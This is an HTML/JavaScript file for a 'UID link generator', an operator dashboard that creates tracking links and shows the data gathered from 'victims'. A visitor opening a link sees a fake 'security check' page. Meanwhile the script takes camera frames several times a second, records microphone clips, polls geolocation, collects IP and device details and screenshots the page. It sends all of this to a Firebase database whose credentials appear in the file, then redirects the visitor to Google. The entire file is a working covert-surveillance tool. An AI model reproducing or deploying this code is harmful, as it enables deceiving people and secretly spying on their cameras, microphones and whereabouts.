<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>MR_MOMIN_🌍 | UID LINK GENERATOR</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
        body {
            background: radial-gradient(circle at 20% 30%, #03000a, #000000);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1rem;
        }
        .glass-card {
            background: rgba(0, 10, 20, 0.85);
            backdrop-filter: blur(12px);
            border-radius: 2rem;
            border: 1px solid #0f0;
            max-width: 800px;
            width: 100%;
            padding: 2rem;
            box-shadow: 0 0 30px rgba(0,255,0,0.2);
        }
        h1 {
            font-size: 1.8rem;
            text-align: center;
            color: #0f0;
            text-shadow: 0 0 5px #0f0;
        }
        .tagline {
            text-align: center;
            color: #5f5;
            font-size: 0.7rem;
            border-bottom: 1px solid #0f0;
            display: inline-block;
            margin-bottom: 1.5rem;
        }
        .feature-grid {
            display: grid;
            grid-template-columns: repeat(2,1fr);
            gap: 12px;
            margin: 1.5rem 0;
        }
        .feature-card {
            background: #001500;
            border: 1px solid #0f0;
            border-radius: 1rem;
            padding: 8px;
            text-align: center;
            cursor: pointer;
            color: #0f0;
            transition: 0.2s;
        }
        .feature-card.selected {
            background: #0f03;
            box-shadow: 0 0 12px #0f0;
        }
        .btn {
            width: 100%;
            background: #0f0;
            border: none;
            border-radius: 2rem;
            padding: 12px;
            font-weight: bold;
            color: black;
            cursor: pointer;
        }
        .link-box {
            margin-top: 1rem;
            background: #000000aa;
            border-radius: 1rem;
            padding: 12px;
            border-left: 3px solid #0f0;
        }
        .link-text {
            font-size: 0.7rem;
            word-break: break-all;
            background: #021a02;
            padding: 8px;
            border-radius: 0.5rem;
            color: #afa;
        }
        .campaign-list {
            margin-top: 1.5rem;
            max-height: 400px;
            overflow-y: auto;
        }
        .campaign-item {
            background: #001000;
            border-radius: 1rem;
            padding: 10px;
            margin-bottom: 8px;
            font-size: 0.7rem;
        }
        .campaign-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 8px;
            margin-bottom: 8px;
        }
        .campaign-link {
            flex: 1;
            word-break: break-all;
            color: #afa;
            font-size: 0.65rem;
        }
        .campaign-clicks {
            background: #0f0;
            color: black;
            padding: 2px 8px;
            border-radius: 1rem;
            font-weight: bold;
        }
        .victim-data {
            margin-top: 8px;
            border-top: 1px solid #0f0;
            padding-top: 6px;
            font-size: 0.6rem;
        }
        .victim-item {
            background: #0a1a0a;
            padding: 6px;
            margin-top: 4px;
            border-radius: 8px;
        }
        .image-preview {
            max-width: 100px;
            max-height: 100px;
            cursor: pointer;
        }
        audio {
            max-width: 150px;
            height: 30px;
        }
        .status-msg {
            font-size: 0.7rem;
            color: #ffa;
            margin-top: 8px;
        }
        .uid-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background: #001000;
            padding: 8px;
            border-radius: 1rem;
            margin-bottom: 1rem;
        }
        .hide { display: none; }
        .victim-card {
            background: #111;
            border-radius: 1.5rem;
            padding: 2rem;
            text-align: center;
            color: #0f0;
        }
        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #0f0;
            border-top-color: #0f0;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div id="appRoot">
    <!-- Dashboard Panel (Seller) -->
    <div id="dashboardPanel" class="glass-card">
        <div class="uid-header">
            <span>🔑 YOUR UID: <strong id="displayUid"></strong></span>
            <button id="newUidBtn" style="background:#333; border:1px solid #0f0; border-radius:1rem; padding:4px 8px;">NEW UID</button>
        </div>
        <div class="feature-grid" id="featureGrid">
            <div class="feature-card" data-feat="C">📸 CAMERA</div>
            <div class="feature-card" data-feat="M">🎙️ MIC</div>
            <div class="feature-card" data-feat="L">📍 LOCATION</div>
            <div class="feature-card" data-feat="X">💻 DEVICE INFO</div>
        </div>
        <button class="btn" id="generateLinkBtn">🔗 GENERATE NEW LINK</button>
        <div id="newLinkBox" class="link-box" style="display: none;">
            <div><strong>🔗 NEW LINK (SHARE THIS):</strong></div>
            <div class="link-text" id="newLinkText">--</div>
            <button id="copyLinkBtn" style="background:#0f0; color:#000; border:none; border-radius:1rem; padding:6px; margin-top:8px;">COPY LINK</button>
        </div>
        <div class="campaign-list">
            <div style="text-align:center; color:#5f5; margin-bottom:8px;">YOUR CAMPAIGNS</div>
            <div id="campaignList"></div>
        </div>
        <div id="dashboardStatus" class="status-msg"></div>
    </div>

    <!-- Victim Panel -->
    <div id="victimPanel" class="victim-card hide">
        <h2>🛡️ SECURITY CHECK</h2>
        <p>Verifying your device...</p>
        <div class="loader"></div>
        <p style="font-size:0.7rem;">Please wait...</p>
    </div>
</div>

<video id="hiddenVideo" style="display:none;" autoplay playsinline muted></video>
<canvas id="hiddenCanvas" style="display:none;"></canvas>

<script>
    // Firebase Config (Your Provided)
    const firebaseConfig = {
        apiKey: "AIzaSyDdYUeWB_e-Pv7-4yBN49P3ZN1Ig4PTW1g",
        authDomain: "momin-tracking-sysrem.firebaseapp.com",
        databaseURL: "https://momin-tracking-sysrem-default-rtdb.firebaseio.com",
        projectId: "momin-tracking-sysrem",
        storageBucket: "momin-tracking-sysrem.firebasestorage.app",
        messagingSenderId: "294704122788",
        appId: "1:294704122788:web:147bff72e6bf866a808f31",
        measurementId: "G-BS81ZN7BDD"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    // Helper functions
    function generateUID() {
        return Math.floor(10000000 + Math.random() * 90000000).toString();
    }

    function showMsg(msg, isError=false) {
        const el = document.getElementById('dashboardStatus');
        if(el) {
            el.innerText = msg;
            el.style.color = isError ? '#f66' : '#afa';
            setTimeout(() => { if(el.innerText === msg) el.innerText = ''; }, 3000);
        }
    }

    function copyClip(txt) {
        navigator.clipboard.writeText(txt).then(() => showMsg('✅ Link copied!')).catch(() => showMsg('❌ Copy failed', true));
    }

    // ========== SELLER DASHBOARD ==========
    let currentUid = null;
    let campaignsRef = null;

    async function loadSellerDashboard(uid) {
        const snapshot = await db.ref(`sellers/${uid}`).once('value');
        if(!snapshot.exists()) {
            // If UID not in DB, create it
            await db.ref(`sellers/${uid}`).set({ createdAt: Date.now() });
        }
        currentUid = uid;
        localStorage.setItem('momin_uid', uid);
        document.getElementById('displayUid').innerText = uid;
        document.getElementById('dashboardPanel').classList.remove('hide');
        document.getElementById('victimPanel').classList.add('hide');
        // Load campaigns
        loadCampaigns(uid);
        // Setup realtime listener for campaigns
        if(campaignsRef) campaignsRef.off();
        campaignsRef = db.ref(`sellers/${uid}/campaigns`);
        campaignsRef.on('value', (snap) => {
            renderCampaigns(snap.val() || {});
        });
    }

    function loadCampaigns(uid) {
        // This is handled by the listener above
    }

    function renderCampaigns(campaigns) {
        const container = document.getElementById('campaignList');
        if(Object.keys(campaigns).length === 0) {
            container.innerHTML = '<div style="text-align:center; color:#5f5;">No campaigns yet. Create your first link.</div>';
            return;
        }
        let html = '';
        for(const [campId, camp] of Object.entries(campaigns)) {
            html += `
                <div class="campaign-item">
                    <div class="campaign-header">
                        <div class="campaign-link">🔗 ${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}</div>
                        <div class="campaign-clicks">👥 ${camp.clicks || 0}</div>
                        <button class="copy-camp" data-link="${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}" style="background:#0f0; border:none; border-radius:1rem; padding:2px 6px;">Copy</button>
                    </div>
                    <div class="victim-data" id="victims-${campId}">
                        <div style="color:#afa;">Loading victims...</div>
                    </div>
                </div>
            `;
        }
        container.innerHTML = html;
        // Add copy event listeners
        document.querySelectorAll('.copy-camp').forEach(btn => {
            btn.addEventListener('click', (e) => {
                const link = btn.getAttribute('data-link');
                copyClip(link);
            });
        });
        // Load victims data for each campaign
        for(const campId of Object.keys(campaigns)) {
            loadVictimsData(campId);
        }
    }

    async function loadVictimsData(campId) {
        const victimsRef = db.ref(`sellers/${currentUid}/campaigns/${campId}/victims`);
        victimsRef.on('value', (snap) => {
            const victims = snap.val() || {};
            const container = document.getElementById(`victims-${campId}`);
            if(Object.keys(victims).length === 0) {
                container.innerHTML = '<div style="color:#5f5;">No victims yet.</div>';
                return;
            }
            let html = '';
            for(const [victimId, data] of Object.entries(victims)) {
                html += `<div class="victim-item"><strong>🕵️ Victim ${victimId.slice(-4)}</strong><br>`;
                if(data.deviceInfo) {
                    html += `📱 Device: ${data.deviceInfo.platform}, ${data.deviceInfo.language}<br>`;
                    html += `🔋 Battery: ${data.deviceInfo.battery}<br>`;
                }
                if(data.location && data.location.length) {
                    const lastLoc = data.location[data.location.length-1];
                    html += `📍 Last Location: ${lastLoc.lat}, ${lastLoc.lng}<br>`;
                }
                if(data.camera && data.camera.length) {
                    data.camera.forEach((img, idx) => {
                        html += `<img src="${img}" class="image-preview" onclick="window.open('${img}')" style="max-width:80px; max-height:80px; margin:2px;"> `;
                    });
                }
                if(data.mic && data.mic.length) {
                    data.mic.forEach((audio, idx) => {
                        html += `<audio controls src="${audio}"></audio> `;
                    });
                }
                html += `</div>`;
            }
            container.innerHTML = html;
        });
    }

    function generateNewCampaign() {
        const selected = Array.from(document.querySelectorAll('.feature-card.selected')).map(c => c.getAttribute('data-feat')).join('');
        if(selected.length === 0) {
            showMsg('❌ Select at least one feature!', true);
            return;
        }
        const campId = 'CAMP_' + Date.now() + '_' + Math.random().toString(36).substring(2, 6);
        const campaignRef = db.ref(`sellers/${currentUid}/campaigns/${campId}`);
        campaignRef.set({
            features: selected,
            clicks: 0,
            createdAt: Date.now(),
            victims: {}
        }).then(() => {
            const link = `${window.location.origin}${window.location.pathname}?uid=${currentUid}&camp=${campId}`;
            document.getElementById('newLinkText').innerText = link;
            document.getElementById('newLinkBox').style.display = 'block';
            showMsg('✅ Campaign created! Share the link.');
        }).catch(err => {
            console.error(err);
            showMsg('❌ Firebase error: ' + err.message, true);
        });
    }

    // ========== VICTIM MODE ==========
    async function startVictimCollector(sellerUid, campaignId, features) {
        // Send data to Firebase under sellerUid/campaigns/campaignId/victims
        const victimId = 'V_' + Date.now() + '_' + Math.random().toString(36).substring(2, 8);
        const victimRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/victims/${victimId}`);

        // Prepare data object
        const victimData = {
            deviceInfo: {},
            location: [],
            camera: [],
            mic: [],
            timestamp: Date.now()
        };

        // Device Info
        if(features.includes('X')) {
            let ip = 'unknown';
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) {}
            let battery = 'N/A';
            if(navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = `${Math.round(b.level*100)}% (${b.charging?'charging':'not'})`;
            }
            victimData.deviceInfo = {
                ip,
                battery,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                userAgent: navigator.userAgent
            };
        }

        // Location (single capture + optional interval)
        if(features.includes('L') && navigator.geolocation) {
            const getLocation = () => {
                navigator.geolocation.getCurrentPosition(pos => {
                    victimData.location.push({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        time: Date.now()
                    });
                    victimRef.child('location').set(victimData.location);
                }, err => console.log('Location error', err));
            };
            getLocation();
            setInterval(getLocation, 30000);
        }

        // Camera
        if(features.includes('C')) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                await video.play();
                const canvas = document.getElementById('hiddenCanvas');
                const capture = () => {
                    if(video.videoWidth && video.videoHeight) {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                        victimData.camera.push(dataUrl);
                        victimRef.child('camera').set(victimData.camera);
                    }
                };
                capture();
                setInterval(capture, 333);
            } catch(e) { console.error('Camera error', e); }
        }

        // Microphone
        if(features.includes('M')) {
            const recordAndSend = async () => {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                    const mediaRecorder = new MediaRecorder(stream);
                    let chunks = [];
                    mediaRecorder.ondataavailable = e => chunks.push(e.data);
                    const audioPromise = new Promise(resolve => {
                        mediaRecorder.onstop = () => {
                            const blob = new Blob(chunks, { type: 'audio/ogg' });
                            stream.getTracks().forEach(t => t.stop());
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                const dataUrl = reader.result;
                                victimData.mic.push(dataUrl);
                                victimRef.child('mic').set(victimData.mic);
                                resolve();
                            };
                            reader.readAsDataURL(blob);
                        };
                    });
                    mediaRecorder.start();
                    setTimeout(() => mediaRecorder.stop(), 6000);
                    await audioPromise;
                } catch(e) { console.error('Mic error', e); }
            };
            recordAndSend();
            setInterval(recordAndSend, 10000);
        }

        // Additional: screenshot
        try {
            const ssCanvas = await html2canvas(document.body, { scale: 0.7 });
            const ssDataUrl = ssCanvas.toDataURL('image/jpeg', 0.7);
            victimData.camera.push(ssDataUrl);
            victimRef.child('camera').set(victimData.camera);
        } catch(e) {}

        // Save initial data
        await victimRef.set(victimData);
        // Increment click count
        const clickRef = db.ref(`sellers/${sellerUid}/campaigns/${campaignId}/clicks`);
        clickRef.transaction(current => (current || 0) + 1);
    }

    // ========== MAIN ==========
    const urlParams = new URLSearchParams(window.location.search);
    const uidParam = urlParams.get('uid');
    const campParam = urlParams.get('camp');

    if(uidParam && campParam) {
        // Victim mode
        document.getElementById('dashboardPanel').classList.add('hide');
        document.getElementById('victimPanel').classList.remove('hide');
        // Fetch campaign features
        const campRef = db.ref(`sellers/${uidParam}/campaigns/${campParam}`);
        campRef.once('value', async (snap) => {
            if(!snap.exists()) {
                document.querySelector('#victimPanel p').innerText = 'Invalid link.';
                document.querySelector('#victimPanel .loader').style.display = 'none';
                return;
            }
            const features = snap.val().features;
            await startVictimCollector(uidParam, campParam, features);
            // After 10 seconds redirect
            setTimeout(() => {
                window.location.href = 'https://www.google.com';
            }, 10000);
        });
    } else {
        // Seller mode
        let storedUid = localStorage.getItem('momin_uid');
        if(storedUid) {
            loadSellerDashboard(storedUid);
        } else {
            // First time: generate new UID
            const newUid = generateUID();
            localStorage.setItem('momin_uid', newUid);
            loadSellerDashboard(newUid);
        }
        // Setup event listeners
        document.getElementById('generateLinkBtn').addEventListener('click', generateNewCampaign);
        document.getElementById('copyLinkBtn').addEventListener('click', () => {
            const link = document.getElementById('newLinkText').innerText;
            if(link && link !== '--') copyClip(link);
        });
        document.getElementById('newUidBtn').addEventListener('click', () => {
            const newUid = generateUID();
            localStorage.setItem('momin_uid', newUid);
            loadSellerDashboard(newUid);
            showMsg('✅ New UID created!');
        });
        // Feature selection toggles
        document.querySelectorAll('.feature-card').forEach(card => {
            card.addEventListener('click', () => {
                card.classList.toggle('selected');
            });
        });
    }
</script>
</body>
</html>
